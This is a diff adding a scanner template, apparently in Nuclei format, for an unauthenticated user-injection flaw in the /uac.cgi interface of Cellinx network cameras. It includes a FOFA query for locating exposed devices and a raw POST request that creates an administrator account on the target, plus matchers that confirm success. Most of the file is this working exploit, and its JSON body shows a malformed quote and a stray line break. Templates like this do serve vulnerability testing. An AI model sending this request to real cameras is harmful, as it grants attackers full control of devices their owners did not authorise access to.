@@ -1,0 +1,30 @@
+id: cellinx-camera-uaccgi-unauthorized-user-add
+
+info:
+  name: Cellinx 网络摄像机 uac.cgi 接口远程未授权用户注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="local/NVT-string.js"
+      该漏洞源于 Cellinx 摄像机系统中 /uac.cgi 接口未正确实施身份验证机制，攻击者可通过构造特制 HTTP 请求在未认证状态下向系统注入任意用户凭证。漏洞利用无需交互即可实现远程用户提权，潜在威胁包括设备控制权劫持及网络横向渗透。
+  tags: Cellinx
+
+http:
+- raw:
+  - |
+    POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Content-Type: application/json;charset=UTF-8
+    Accept-Encoding: gzip
+
+    {"jsonData": {"username":"guest","password":"","option":"add_user", "data":{"username":"NdayTest","password":"NdayTest","r
+    permission":{"is_admin":"1","view":"1","ptz":"1","setting":“1","dout":"1"}}}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Success'
